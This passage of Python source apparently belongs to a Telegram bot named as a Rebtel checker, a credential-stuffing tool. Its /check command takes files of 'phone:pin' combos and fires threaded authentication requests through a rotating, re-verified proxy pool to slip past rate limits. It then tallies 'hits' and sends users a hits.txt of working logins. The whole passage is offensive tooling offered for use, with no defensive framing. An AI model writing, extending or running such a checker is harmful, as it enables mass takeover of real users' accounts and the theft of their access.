        if now - job.last_edit < STATUS_EDIT_MIN_INTERVAL:
            return
        job.last_edit = now
    _threadsafe_send(_safe_edit_message(context, job.chat_id, job.status_msg_id, status_text(job)))


def _run_check(job: CheckJob, combos: List[Tuple[str, str]], context: ContextTypes.DEFAULT_TYPE) -> None:
    """Blocking function that runs the checker with a thread pool."""
    clog(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
    clog(f"{Colors.CYAN}CHECK START  chat={job.chat_id}  combos={len(combos)}  "
         f"threads={job.threads}  proxy={'yes' if job.use_proxy else 'no'}{Colors.RESET}")
    clog(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
    workers = min(job.threads, max(1, len(combos)))
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futs = [ex.submit(send_authentication_request, ph, pn, 1, job, context) for ph, pn in combos]
        for _ in concurrent.futures.as_completed(futs):
            if job.should_stop():
                break
        if job.should_stop():
            for f in futs:
                f.cancel()
    # Summary
    elapsed = time.time() - job.start_time
    rate = job.checked / elapsed if elapsed > 0 else 0.0
    clog(f"{Colors.BOLD}{Colors.CYAN}{'='*60}{Colors.RESET}")
    clog(f"{Colors.BOLD}{Colors.CYAN}CHECK DONE  chat={job.chat_id}{Colors.RESET}")
    clog(f"  Checked: {job.checked}/{job.total}")
    clog(f"  {Colors.GREEN}Hits: {job.hits}{Colors.RESET}   "
         f"{Colors.RED}Fails: {job.fails}{Colors.RESET}   "
         f"{Colors.YELLOW}Errors: {job.errors}{Colors.RESET}")
    clog(f"  Time: {_format_eta(elapsed)}   Rate: {rate:.2f}/s")
    clog(f"{Colors.BOLD}{Colors.CYAN}{'='*60}{Colors.RESET}")
    if job.hits_lines:
        clog(f"{Colors.GREEN}Hits list ({job.hits}):{Colors.RESET}")
        for h in job.hits_lines:
            clog(f"  {Colors.GREEN}{h}{Colors.RESET}")


async def cmd_check(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    msg = update.message
    chat_id = msg.chat_id
    clog(f"[cmd] /check from chat={chat_id} user={update.effective_user} args={context.args}")

    # Reject if a job is already running for this chat.
    with active_jobs_lock:
        if chat_id in active_jobs and not active_jobs[chat_id].should_stop():
            await msg.reply_text("A check is already running for this chat. Use /stop first.")
            return

    if msg.reply_to_message is None:
        await msg.reply_text("Reply `/check [threads]` to a `.txt` file of `phone:pin` combos.", parse_mode=ParseMode.MARKDOWN)
        return

    data, filename = await download_replied_file(update, context)
    if data is None:
        await msg.reply_text("Could not download a file from the replied message.")
        return
    text = data.decode("utf-8", errors="ignore")
    combos = read_combos(text)
    if not combos:
        await msg.reply_text("No `phone:pin` combos found in that file.", parse_mode=ParseMode.MARKDOWN)
        return

    # Threads argument.
    threads = DEFAULT_THREADS
    if context.args:
        try:
            threads = int(context.args[0])
        except ValueError:
            await msg.reply_text(f"Invalid thread count. Using default {DEFAULT_THREADS}.")
            threads = DEFAULT_THREADS
    threads = max(1, min(threads, MAX_THREADS))

    pool_n = proxy_manager.count()
    if pool_n > 0 and not SKIP_POOL_REVERIFY:
        status_msg = await msg.reply_text(
            f"Re-verifying {pool_n} proxies from the pool before checking...",
            parse_mode=ParseMode.MARKDOWN,
        )
        rv_state = {"done": 0, "working": 0, "last_t": 0.0}

        def rv_progress(done, total, working):
            rv_state["done"] = done
            rv_state["working"] = working
            now = time.time()
            if now - rv_state["last_t"] >= STATUS_EDIT_MIN_INTERVAL:
                rv_state["last_t"] = now
                _threadsafe_send(_safe_edit_message(
                    context,
                    chat_id,
                    status_msg.message_id,
                    f"Re-verifying pool ... `{working}` alive / `{done}`/`{total}` checked",
                ))

        loop = asyncio.get_running_loop()
        current_pool = proxy_manager.get_all()
        working_after = await loop.run_in_executor(
            None,
            lambda: validate_proxies(current_pool, progress_cb=rv_progress),
        )
        working_set = set(working_after)
        dead = [p for p in current_pool if p not in working_set]
        for d in dead:
            proxy_manager.remove(d)

        pool_n = proxy_manager.count()
        await status_msg.edit_text(
            f"Pool re-verified. Working: {pool_n}  Dead removed: {len(dead)}.",
            parse_mode=ParseMode.MARKDOWN,
        )
        if pool_n == 0:
            await msg.reply_text(
                "No working proxies left in the pool after re-verification.\n"
                "Add proxies with /setpr or /addpr, or run without a pool."
            )
    elif pool_n > 0 and SKIP_POOL_REVERIFY:
        await msg.reply_text(
            f"Using {pool_n} proxies from the pool (re-verify skipped). "
            f"Dead ones will drop out naturally during the check."
        )

    mode = f"Proxy ({pool_n} in pool)" if pool_n else "Proxyless"
    status_msg = await msg.reply_text(
        f"Starting check...\nCombos: {len(combos)}\nThreads: {threads}\nMode: {mode}",
        parse_mode=ParseMode.MARKDOWN,
    )

    job = CheckJob(chat_id=chat_id, total=len(combos), status_msg_id=status_msg.message_id, threads=threads)
    with active_jobs_lock:
        active_jobs[chat_id] = job

    loop = asyncio.get_running_loop()
    # Run the blocking checker in the default executor (a separate thread).
    try:
        await loop.run_in_executor(None, _run_check, job, combos, context)
    finally:
        # Final status update + send hits.txt.
        final = (
            f"*Check finished.*\n"
            f"Checked: {job.checked}/{job.total}\n"
            f"Hits: {job.hits}\nFails: {job.fails}\nErrors: {job.errors}\n"
            f"Time: {_format_eta(time.time() - job.start_time)}"
        )
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=status_msg.message_id, text=final, parse_mode=ParseMode.MARKDOWN
            )
        except Exception:
            pass
        # Send hits.txt as a document (in-memory).
        try:
            with open(job.hits_filename, "r", encoding="utf-8") as fh:
                content = fh.read()
        except Exception:
            content = "\n".join(job.hits_lines)
        bio = io.BytesIO(content.encode("utf-8"))
        out_name = f"hits_{chat_id}.txt"
        bio.name = out_name
        await context.bot.send_document(
            chat_id=chat_id,
            document=InputFile(bio, filename=out_name),
            caption=f"hits.txt ({job.hits} hits)",
        )
        with active_jobs_lock:
            active_jobs.pop(chat_id, None)
        try:
            os.remove(job.hits_filename)
        except Exception:
            pass


async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.message.chat_id
    clog(f"[cmd] /stop from chat={chat_id} user={update.effective_user}")
    with active_jobs_lock:
        job = active_jobs.get(chat_id)
    if job is None or job.should_stop():
        await update.message.reply_text("No active check to stop for this chat.")
        return
    job.stop_event.set()
    await update.message.reply_text("Stop signal sent. In-flight requests will finish, new ones skipped.")


# --------------------------------------------------------------------------- #
#  Unknown text fallback
# --------------------------------------------------------------------------- #
async def cmd_unknown(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("Unknown command. See /help")


# --------------------------------------------------------------------------- #
#  Main
# --------------------------------------------------------------------------- #
def build_app() -> Application:
    app = ApplicationBuilder().token(BOT_TOKEN).post_init(post_init).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("clean", cmd_clean))
    app.add_handler(CommandHandler("check", cmd_check))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("setpr", cmd_setpr))
    app.add_handler(CommandHandler("addpr", cmd_addpr))
    app.add_handler(CommandHandler("clearpr", cmd_clearpr))
    app.add_handler(CommandHandler("listpr", cmd_listpr))
    app.add_handler(CommandHandler("pool", cmd_listpr))
    app.add_handler(MessageHandler(filters.COMMAND, cmd_unknown))
    return app


def main() -> None:
    app = build_app()
    n = proxy_manager.count()
    clog(f"{Colors.BOLD}{Colors.CYAN}Rebtel Telegram bot starting...{Colors.RESET}")
    clog(f"{Colors.CYAN}Loaded {n} proxies from {PROXY_POOL_FILE}{Colors.RESET}")
    clog(f"{Colors.CYAN}Token: {BOT_TOKEN[:12]}...{Colors.RESET}")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
